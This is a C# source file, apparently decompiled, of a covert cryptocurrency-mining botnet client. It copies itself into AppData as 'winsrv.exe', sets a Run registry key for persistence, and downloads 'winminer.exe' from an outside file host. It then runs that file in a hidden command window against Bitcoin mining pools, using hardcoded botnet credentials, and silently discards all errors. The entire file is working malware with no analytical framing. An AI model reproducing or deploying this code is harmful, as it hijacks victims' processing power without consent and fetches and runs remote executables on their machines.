using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class Main
{
	private static string EXE_PATH = Path.Combine(Interaction.Environ("AppData"), "winminer.exe");

	private static string MINER_URL = "http://ge.tt/api/1/files/1HhgPWe/0/blob?download";

	private static void Download()
	{
		using WebClient webClient = new WebClient();
		webClient.DownloadFile(MINER_URL, EXE_PATH);
	}

	public static void Start(string Pool, string Username, string Password, int nCores, bool GPU = false)
	{
		if (!File.Exists(EXE_PATH))
		{
			Download();
		}
		Process process = new Process();
		ProcessStartInfo startInfo = process.StartInfo;
		startInfo.FileName = "cmd.exe";
		startInfo.WindowStyle = ProcessWindowStyle.Hidden;
		startInfo.CreateNoWindow = true;
		if (GPU)
		{
			startInfo.Arguments = string.Format("/c " + EXE_PATH + " -o {0} -u {1} -p {2} -t {3} -g yes", Pool, Username, Password, nCores);
		}
		else
		{
			startInfo.Arguments = string.Format("/c " + EXE_PATH + " -o {0} -u {1} -p {2} -t {3} -g no", Pool, Username, Password, nCores);
		}
		startInfo = null;
		process.Start();
	}

	public static void Close()
	{
		Process[] processesByName = Process.GetProcessesByName("winminer");
		Process[] array = processesByName;
		foreach (Process process in array)
		{
			process.Kill();
		}
	}

	[STAThread]
	public static void Main()
	{
		try
		{
			Close();
			File.Copy(Assembly.GetExecutingAssembly().Location, Interaction.Environ("AppData") + "\\winsrv.exe");
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("winsrv.exe", Interaction.Environ("AppData") + "\\winsrv.exe");
			string pool = "http://getwork.btcguild.com:8332/";
			string username = "inuyasha2876_botnet";
			string password = "123";
			int nCores = checked((int)Math.Round((double)Environment.ProcessorCount / 100.0 * 50.0 - 1.0));
			Start("http://eu.triplemining.com:8344/", "java_ja", "apfel123", 1);
			Start(pool, username, password, nCores);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
